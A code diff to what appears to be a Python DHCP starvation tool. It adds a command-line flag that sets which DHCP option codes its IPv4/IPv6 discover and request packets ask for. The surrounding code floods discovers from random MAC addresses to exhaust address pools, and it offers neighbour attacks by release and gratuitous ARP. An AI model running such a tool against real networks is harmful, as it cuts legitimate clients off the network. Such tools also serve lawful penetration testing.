@@ -17,6 +17,7 @@ Options:
     -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way) (off)
     
     -s, --client-src               ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
+    -O, --request-options          ... option-codes to request e.g. 21,22,23 or 12,14-19,23 (Default: 0-80)
     
     -f, --fuzz                     ... randomly fuzz packets (off)
 
@@ -137,16 +138,17 @@ DO_v6_RC = False
 VERBOSITY = 3
 THREAD_CNT = 1
 THREAD_POOL = []
+REQUEST_OPTS = range(80)
 
 def checkArgs():
-    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM
+    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM,REQUEST_OPTS
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrns:c1v:t:", ["help","show-arp","show-icmp",
+        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrns:c1v:t:O:", ["help","show-arp","show-icmp",
                                                                       "show-options","timeout-threads=","timeout-dos=",
                                                                       "timeout-dhcprequest=", "neighbors-scan-arp",
                                                                       "neighbors-attack-release", "neighbors-attack-garp",
                                                                       "fuzz","ipv6","client-src=","color","v6-rapid-commit",
-                                                                      "verbosity=","threads=", "show-lease-confirm"])
+                                                                      "verbosity=","threads=", "show-lease-confirm","request-options="])
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
@@ -192,6 +194,20 @@ def checkArgs():
                 conf.verb = True
         elif o in ("-t", "--threads"):
             THREAD_CNT = int(a)
+        elif o in ("-O", "--request-options"):
+            REQUEST_OPTS=[]
+            for o in a.split(","):
+                if "-" in o:
+                    x = o.split("-")
+                    if len(x)==2:
+                        REQUEST_OPTS+=range(int(x[0]),int(x[1]))
+                    else:
+                        print "Error in option - request-options"
+                        usage()
+                        exit()
+                else:
+                    REQUEST_OPTS.append(int(o))
+            #REQUEST_OPTS = [int(o) for o in REQUEST_OPTS]
         else:
             assert False, "unhandled option"
     if len(args)==1:
@@ -208,6 +224,9 @@ def checkArgs():
         SHOW_ARP                        %s
         SHOW_ICMP                       %s
         SHOW_DHCPOPTIONS                %s
+        SHOW_LEASE_CONFIRMATION         %s
+        
+        REQUEST_DHCP_Options            %s
 
         timeout-threads                 %s
         timeout-dos                     %s
@@ -221,7 +240,7 @@ def checkArgs():
         
         color                           %s
 -----------------------------------------
-        """%(MODE_IPv6,MODE_FUZZ,SHOW_ARP,SHOW_ICMP,SHOW_DHCPOPTIONS,
+        """%(MODE_IPv6,MODE_FUZZ,SHOW_ARP,SHOW_ICMP,SHOW_DHCPOPTIONS,SHOW_LEASE_CONFIRM,repr(REQUEST_OPTS),
              TIMEOUT['timer'],TIMEOUT['dos'],TIMEOUT['dhcpip'],
              DO_GARP,DO_RELEASE,DO_ARP,repr(MAC_LIST),DO_COLOR)
 
@@ -346,14 +365,14 @@ def v6_build_ether(mac):
     ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(src=IPv6LL,dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
     return ethead
 
-def v6_build_discover(mac,trid=None):
+def v6_build_discover(mac,trid=None,options=[23,24]):
     ethead=v6_build_ether(mac)
     trid=trid or random.randint(0x00,0xffffff)
     cli_id=DHCP6OptClientId(duid=DUID_LLT(lladdr=mac,timeval=int(time.time())))
     if DO_v6_RC:
-        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptRapidCommit()/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=[23,24])
+        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptRapidCommit()/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=options)
     else:
-        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=[23,24])
+        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=options)
     return dhcp_discover
 
 def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
@@ -362,7 +381,7 @@ def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
     srv_id=DHCP6OptServerId(duid=p_advertise[DHCP6OptServerId].duid)
     cli_id=p_advertise[DHCP6OptClientId]
     iana=DHCP6OptIA_NA(ianaopts=p_advertise[DHCP6OptIA_NA].ianaopts, iaid=iaid)
-    dhcp_request=ethead/DHCP6_Request(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()/DHCP6OptOptReq( reqopts=[23,24])
+    dhcp_request=ethead/DHCP6_Request(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()/DHCP6OptOptReq( reqopts=options)
     return dhcp_request
 
 def v6_build_release(p_advertise,mac,iaid=0xf,trid=None):
@@ -474,14 +493,14 @@ class send_dhcp(threading.Thread):
         self.kill_received = False
 
     def run(self):
-        global TIMEOUT,dhcpdos
+        global TIMEOUT,dhcpdos,REQUEST_OPTS
         while not self.kill_received and not dhcpdos:
             m=randomMAC()
             #m="00:00:00:00:00:00"
             myxid=random.randint(1, 900000000)
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
             if MODE_IPv6:
-                dhcp_discover=v6_build_discover(m,trid=myxid)
+                dhcp_discover=v6_build_discover(m,trid=myxid,options=REQUEST_OPTS)
                 LOG(type="-->", message= "v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
             else:
                 dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
@@ -514,7 +533,7 @@ class sniff_dhcp(threading.Thread):
             if not MODE_FUZZ and self.dhcpcount==5: dhcpdos=True
           
     def detect_dhcp(self,pkt):
-        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM
+        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM,REQUEST_OPTS
         if MODE_IPv6:
             if DHCP6_Advertise in pkt:
                 self.dhcpcount=0
@@ -536,7 +555,7 @@ class sniff_dhcp(threading.Thread):
                     
                     if not DO_v6_RC:
                         # we dont need to request the address if we're using rapid commit mode (2 message: solict / reply)
-                        dhcp_req=v6_build_request(pkt,options=range(30))
+                        dhcp_req=v6_build_request(pkt,options=REQUEST_OPTS)
                         sendPacket(dhcp_req)
                         LOG(type="-->", message= "v6 REQUEST ACK IPv6[%s]\n"%myip)
 
